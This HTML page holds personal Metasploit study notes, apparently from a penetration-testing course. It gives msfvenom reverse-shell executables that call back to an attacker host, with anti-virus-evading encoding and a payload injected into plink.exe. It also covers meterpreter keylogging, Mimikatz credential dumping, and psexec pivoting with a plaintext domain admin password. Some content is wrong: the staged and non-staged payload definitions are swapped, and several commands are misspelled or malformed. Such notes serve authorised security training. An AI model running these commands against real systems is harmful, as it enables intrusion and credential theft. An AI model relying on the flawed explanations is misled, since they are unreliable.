<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Metasploit</title>
</head><body>User interface and setup:<ul><li style="list-style-type: none">sudo systemctl start postgresql</li>
<li style="list-style-type: none">sudo systemctl enable postgresql</li>
<li style="list-style-type: none">sudo msfdb init</li>
<li style="list-style-type: none">sudo apt update &amp;&amp; sudo apt install metasploit-framework</li>
<li style="list-style-type: none">msfconsole</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">version</li>
<li style="list-style-type: none">help</li>
<li style="list-style-type: none">show/show -h</li>
<li style="list-style-type: none">use</li>
<li style="list-style-type: none">info</li>
<li style="list-style-type: none">show options</li>
<li style="list-style-type: none">set/unset</li>
<li style="list-style-type: none">setg/unsetg</li>
<li style="list-style-type: none">run/exploit</li>
<li style="list-style-type: none">back</li>
<li style="list-style-type: none">previous</li>
<li style="list-style-type: none">clear</li>
<li style="list-style-type: none">services</li>
<li style="list-style-type: none">hosts</li>
<li style="list-style-type: none">creds</li>
<li style="list-style-type: none">db_nmap</li>
<li style="list-style-type: none">workspace/workspace -a XXX/workspace XXX/workspace -d XXX</li>
<li style="list-style-type: none">search/search -h</li>
<li style="list-style-type: none">search type:auxiliary name:smb</li>
</ul>
</li>
</ul>
Exploit modules:<ul><li style="list-style-type: none">set payload</li>
<li style="list-style-type: none">check</li>
</ul>
Metasploit payloads:<ul><li style="list-style-type: none">Staged payloads (i.e. shell/reverse_tcp): the payload is sent in its entirety together with the exploit code</li>
<li style="list-style-type: none">Non-staged payloads (i.e. shell_reverse_tcp): a staged payload is usually sent in two parts. The first part is usually a small primary payload that causes the victim machine to call back to the attacker, transfer a larger shellcode and then execute it. </li>
<li style="list-style-type: none">Situations where a staged payload is preferred over a non-staged payload are for example when the vulnerability we are exploiting does not provide enough buffer space to pass the full payload in one time or to avoid anti-virus detection</li>
</ul>
Meterpreter:<ul><li style="list-style-type: none">Meterpeter is a multi-function payload that can be dynamically extended at runtime</li>
<li style="list-style-type: none">This means that a meterpreter shell offers, on top of the features of a standard shell, functionalities such as file transfer, key logging, etc.</li>
<li style="list-style-type: none">meterpreter &gt; help</li>
<li style="list-style-type: none">meterpreter &gt; sysinfo</li>
<li style="list-style-type: none">meterpreter &gt; getuid</li>
<li style="list-style-type: none">meterpreter &gt; upload sourcepathlocal destinationpathremote</li>
<li style="list-style-type: none">meterpreter &gt; download sourcepathremote destinationpathlocal</li>
<li style="list-style-type: none">meterpreter &gt; pwd</li>
<li style="list-style-type: none">meterpreter &gt; ls</li>
<li style="list-style-type: none">meterpreter &gt; cd</li>
<li style="list-style-type: none">meterpreter &gt; shell (***this is a persistent shell, we can close it and respawn a new shell with meterpeter***)</li>
<li style="list-style-type: none">meterpreter &gt; execute -f notepad</li>
<li style="list-style-type: none">meterpreter &gt; ps</li>
<li style="list-style-type: none">meterpreter &gt; kill</li>
<li style="list-style-type: none">meterpreter &gt; exit</li>
</ul>
Executable payloads:<ul><li style="list-style-type: none">Metasploit payloads can be exported into files with various extensions (i.e. .asp, .vbs, .jar, .war, .dll, .exe, ...)</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe</li>
<li style="list-style-type: none">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_encoded.exe</li>
</ul>
</li>
<li style="list-style-type: none">Metasploit can also inject payloads into existing executables</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/plink.exe -o shell_reverse_encoded_embedded.exe</li>
</ul>
</li>
<li style="list-style-type: none">Alternatively to msfvenom, we can generate the same payload-injected executables from within metasploit, with the generate command</li>
</ul>
Metasploit Exploit Multi Handler:<ul><li style="list-style-type: none">We use the multi handler with the command: msf5 &gt; use multi/handler</li>
<li style="list-style-type: none">The we set all the required options: &nbsp;set options</li>
<li style="list-style-type: none">We then run the handler with the -j flag, which sends the listener in background and does not block the metasploit console while waiting for the victim to connect: msf5 &gt; exploit -j</li>
<li style="list-style-type: none">We can check the background jobs with the jobs command: msf5 &gt; jobs</li>
</ul>
Client-side attacks:<ul><li style="list-style-type: none">Metasploit supports many executable formats that are particularly useful when implementing client-side attacks, for example hta-psh, vba and vba-psh</li>
<li style="list-style-type: none">We can review these formats with: msf5 &gt; msfvenom &nbsp;-l formats | head -n 35</li>
<li style="list-style-type: none">Metasploit also contains multimple browser exploits (i.e. using vulnerabilities in flash)</li>
</ul>
Advanced features and transports:<ul><li style="list-style-type: none">One of these advanced features are advanced encoders for payloads:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; use multi/handler</li>
<li style="list-style-type: none">msf5 &gt; show advanced</li>
<li style="list-style-type: none">msf5 &gt; set EnableStageEncoding true</li>
<li style="list-style-type: none">msf5 &gt; set StageEncoder x86/shikata_ga_nai</li>
</ul>
</li>
<li style="list-style-type: none">Autorun: the autorun options allows metasploit to execute an action when a meterpreter connection is established, especially useful during a client-side attack. For example, we can configure the windows enum_logged_on_users module to automatically enumerate logged in users when meterpreter connects:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; set AutoRunScript windows/gather/enum_logged_on_users</li>
<li style="list-style-type: none">msf5 &gt; exploit</li>
</ul>
</li>
<li style="list-style-type: none">We can also temporarily exit the meterpreter shell, perform other tasks within the metasploit framework and then re-entrer the meterpeter session if needed:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">meterpreter &gt; background</li>
<li style="list-style-type: none">msf5 &gt; sessions -l</li>
<li style="list-style-type: none">msf5 &gt; sessions -i X</li>
</ul>
</li>
<li style="list-style-type: none">We can use meterpreter payload transports to switch protocol after the initial compromise:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">To list available transports for the current meterpreter session: meterpreter &gt; transport list</li>
<li style="list-style-type: none">We can add a new transport protocol to the current meterpreter session with: meterpreter &gt; add -t reverse_tcp -l 10.11.0.4 -p 5555</li>
<li style="list-style-type: none">To change transport method to the newly created one: meterpreter &gt; transport next</li>
</ul>
</li>
</ul>
Post-Exploitation with Metasploit:<ul><li style="list-style-type: none">Core post-exploitation features: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Screenshot command: meterpreter &gt; screenshot</li>
<li style="list-style-type: none">Key logger:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">meterpreter &gt; keyscan_start</li>
<li style="list-style-type: none">meterpreter &gt; keyscan_dump</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Migrating processes: we can move the execution of meterpreter to a different process if needeed. Note that we are allowed to migrate to processes executed at integrity level or privilege equal or lower than that of the current process</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">meterpreter &gt; ps</li>
<li style="list-style-type: none">meterpreter &gt; migrate blablaprocessid</li>
</ul>
</li>
<li style="list-style-type: none">Post-exploitation modules:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Powershell meterpreter module:</li>
<li style="list-style-type: none">meterpreter &gt; load powershell</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">meterpreter &gt; help powershell</li>
<li style="list-style-type: none">meterpreter &gt; powershell_execute "$PSVersionTable.PSVersion"</li>
</ul>
</li>
<li style="list-style-type: none">Mimikatz meterpreter module:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">meterpreter &gt; load kiwi</li>
<li style="list-style-type: none">meterpreter &gt; getsyste</li>
<li style="list-style-type: none">meterpreter &gt; cred_msv</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Pivoting with the metasploit framework:</li>
</ul>
<br/>
Let'<ul><li style="list-style-type: none">s leverage our existing meterpreter session to enumerate the internal network Active Directory infrastructure and pivot to other machines. </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">For example we want to scan a machine on the 192.168.1.0/24 network (the target machine is 192.168.1.110), while our meterpreter session is open on a dual-homed machine with IP addresses 10.11.0.22 and 192.168.1.111:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; route add 192.168.1.0/24 2</li>
<li style="list-style-type: none">msf5 &gt; route print</li>
<li style="list-style-type: none">msf5 &gt; use auxiliary/scanner/portscan/tcp</li>
<li style="list-style-type: none">msf5 &gt; set RHOSTS 192.168.1.110</li>
<li style="list-style-type: none">msf5 &gt; set PORTS 445, 3389</li>
<li style="list-style-type: none">msf5 &gt; run</li>
</ul>
</li>
<li style="list-style-type: none">Since we have already reached Domain Admin access level credentialsm we can try to pivot to the machine at 192.168.1.110:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; use exploit/windows/smb/psexec</li>
<li style="list-style-type: none">msf5 &gt; show options</li>
<li style="list-style-type: none">msf5 &gt; set SMBDomain corp</li>
<li style="list-style-type: none">msf5 &gt; set SMBUser jeff_admin</li>
<li style="list-style-type: none">msf5 &gt; set SMBPass Qwerty09!</li>
<li style="list-style-type: none">msf5 &gt; set RHOSTS 192.168.1.110</li>
<li style="list-style-type: none">msf5 &gt; set payload windows/meterpreter/bind_tcp</li>
<li style="list-style-type: none">msf5 &gt; set RHOST 192.168.1.110</li>
<li style="list-style-type: none">msf5 &gt; set LPORT 444</li>
</ul>
</li>
<li style="list-style-type: none">It is important to note that the added route will work only for already established connections, thus the new shell on 192.168.1.110 must be a bind shell (a reverse shell payload wouldn"t work)</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; exploit</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Autoroute:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Alternatively to manual pivoting, we can use the Autoroute post-exploitation module:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; use multi/manage/autoroute</li>
<li style="list-style-type: none">msf5 &gt; show options</li>
<li style="list-style-type: none">msf5 &gt; session -l</li>
<li style="list-style-type: none">msf5 &gt; set SESSION 2</li>
</ul>
</li>
<li style="list-style-type: none">We run the module to set the new route automatically:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; exploit</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">socks4a:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We can combine routes with the sock4a server module to configure a socks proxy to allow applications outside the metasploit framework to tunnel thru the pivot:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf5 &gt; use auxiliary/server/socks4a</li>
<li style="list-style-type: none">msf5 &gt; show options</li>
<li style="list-style-type: none">msf5 &gt; set SRVHOST 127.0.0.1</li>
<li style="list-style-type: none">msf5 &gt; exploit -j</li>
</ul>
</li>
<li style="list-style-type: none">We now need to update pur proxychains configuration file (/etc/proxychains.conf) to take advantage of the soks proxy by adding a configuration line at the end of the conf file:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">sudo bash -c "socks4 127.0.0.1 1080" &gt;&gt; /etc/proxychains.conf</li>
</ul>
</li>
<li style="list-style-type: none">Finally, we can use proxychains to run rdestop to obtain GUI access from our kali machine to the machine in the internal network:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">sudo proxychains rdesktop 192.168.1.110</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Port forwarding:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We can use the portfwd command from inside a meterpreter session, which will forward a specific port into the internal network:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">meterpreter &gt; portfwd -h</li>
<li style="list-style-type: none">meterpreter &gt; add -l 3389 -p 3389 -r 192.168.1.110</li>
</ul>
</li>
<li style="list-style-type: none">Then, we point the rdesktop application to our localhost to actually connect to the machine in the internal network on 192.168.1.110:</li>
</ul>
</li>
</ul>
<ul><ul><ul>rdesktop 127.0.0.1</ul>
</ul>
</ul>
<br/>
Metasploit automation:<ul><li style="list-style-type: none">Resource scripts:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">sudo msfconsole -r setup.rc</li>
</ul>
</li>
</ul>
</body></html>